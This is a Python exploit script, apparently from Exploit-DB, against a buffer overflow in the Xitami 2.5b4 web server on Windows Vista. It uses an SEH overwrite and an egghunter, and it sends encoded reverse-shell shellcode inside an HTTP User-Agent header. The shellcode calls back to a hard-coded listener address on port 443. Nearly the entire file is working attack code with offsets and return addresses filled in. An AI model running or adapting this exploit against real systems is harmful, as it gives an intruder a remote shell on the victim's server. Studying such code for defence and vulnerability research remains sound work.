# Author	: RIZAL MUHAMMED [UB3RSiCK]
# Desc.		: XITAMI 2.5b4 Buffer Overflow Exploit, SEH, EGGHUNTER, ASLR Bypass
# OS		: Windows Vista ULTIMATE x86 SP2
# Exploit DB	: https://www.exploit-db.com/exploits/17361
# Date		: 10/03/2018

import sys
import struct
from socket import create_connection as cc

def p(a):
	return struct.pack("I", a)

if len(sys.argv) < 2:
	print 'Usage : {} TARGET_IP'.format(sys.argv[0])
	sys.exit()

host = str(sys.argv[1])
port = 80

try:
	sock = cc((host, port))
except:
	print "Connection Error\n"
	sys.exit()

# T00W
egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.3.130 LPORT=443 EXITFUNC=thread -f c -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
shell = ("\xdb\xc9\xb8\xd0\x9e\xaf\xa0\xd9\x74\x24\xf4\x5f\x33\xc9\xb1"
"\x52\x83\xc7\x04\x31\x47\x13\x03\x97\x8d\x4d\x55\xeb\x5a\x13"
"\x96\x13\x9b\x74\x1e\xf6\xaa\xb4\x44\x73\x9c\x04\x0e\xd1\x11"
"\xee\x42\xc1\xa2\x82\x4a\xe6\x03\x28\xad\xc9\x94\x01\x8d\x48"
"\x17\x58\xc2\xaa\x26\x93\x17\xab\x6f\xce\xda\xf9\x38\x84\x49"
"\xed\x4d\xd0\x51\x86\x1e\xf4\xd1\x7b\xd6\xf7\xf0\x2a\x6c\xae"
"\xd2\xcd\xa1\xda\x5a\xd5\xa6\xe7\x15\x6e\x1c\x93\xa7\xa6\x6c"
"\x5c\x0b\x87\x40\xaf\x55\xc0\x67\x50\x20\x38\x94\xed\x33\xff"
"\xe6\x29\xb1\x1b\x40\xb9\x61\xc7\x70\x6e\xf7\x8c\x7f\xdb\x73"
"\xca\x63\xda\x50\x61\x9f\x57\x57\xa5\x29\x23\x7c\x61\x71\xf7"
"\x1d\x30\xdf\x56\x21\x22\x80\x07\x87\x29\x2d\x53\xba\x70\x3a"
"\x90\xf7\x8a\xba\xbe\x80\xf9\x88\x61\x3b\x95\xa0\xea\xe5\x62"
"\xc6\xc0\x52\xfc\x39\xeb\xa2\xd5\xfd\xbf\xf2\x4d\xd7\xbf\x98"
"\x8d\xd8\x15\x0e\xdd\x76\xc6\xef\x8d\x36\xb6\x87\xc7\xb8\xe9"
"\xb8\xe8\x12\x82\x53\x13\xf5\x6d\x0b\x18\x87\x06\x4e\x1e\x86"
"\x6d\xc7\xf8\xe2\x81\x8e\x53\x9b\x38\x8b\x2f\x3a\xc4\x01\x4a"
"\x7c\x4e\xa6\xab\x33\xa7\xc3\xbf\xa4\x47\x9e\x9d\x63\x57\x34"
"\x89\xe8\xca\xd3\x49\x66\xf7\x4b\x1e\x2f\xc9\x85\xca\xdd\x70"
"\x3c\xe8\x1f\xe4\x07\xa8\xfb\xd5\x86\x31\x89\x62\xad\x21\x57"
"\x6a\xe9\x15\x07\x3d\xa7\xc3\xe1\x97\x09\xbd\xbb\x44\xc0\x29"
"\x3d\xa7\xd3\x2f\x42\xe2\xa5\xcf\xf3\x5b\xf0\xf0\x3c\x0c\xf4"
"\x89\x20\xac\xfb\x40\xe1\xcc\x19\x40\x1c\x65\x84\x01\x9d\xe8"
"\x37\xfc\xe2\x14\xb4\xf4\x9a\xe2\xa4\x7d\x9e\xaf\x62\x6e\xd2"
"\xa0\x06\x90\x41\xc0\x02")

target = host

# EIP Offset 72
# JMP ESP 004597DB in xiwin32.exe


# CRASH 1 - Vanilla EIP, EIP Offset 72
#-----------------------------------------------
# EIP 3byte overwrite
#buf = "A"*72 + "\xDB\x97\x45"  #+ "C"*(192-72-4)



# Crash 2 - SEH, nSEH Offset 188, SEH Offset 192
#----------------------------------------------
# PPR 0044D9C4, 3 byte overwrite because of null byte in the address
SEH = "\xC4\xD9\x44"

# Jump back 64 bytes into buffer, enough space to accomodate egghunter
nSEH = "\xEB\xC0\x90\x90"
buf = "A"*(188-62) + "\x90"*16 + egghunter + "\x90"*14 + nSEH + SEH


shellcode = "T00WT00W" + shell + "D"*(500-len(shell))

header = (
'GET / HTTP/1.1\r\n'
'Host: %s\r\n'
'If-Modified-Since: pwned, %s\r\n'
'User-Agent: %s\r\n'			# Inject shellcode in User-Agent header for egghunte to find
'\r\n') % (target, buf, shellcode)

print "[*] Sending UB3R payload xD"
sock.send(header)
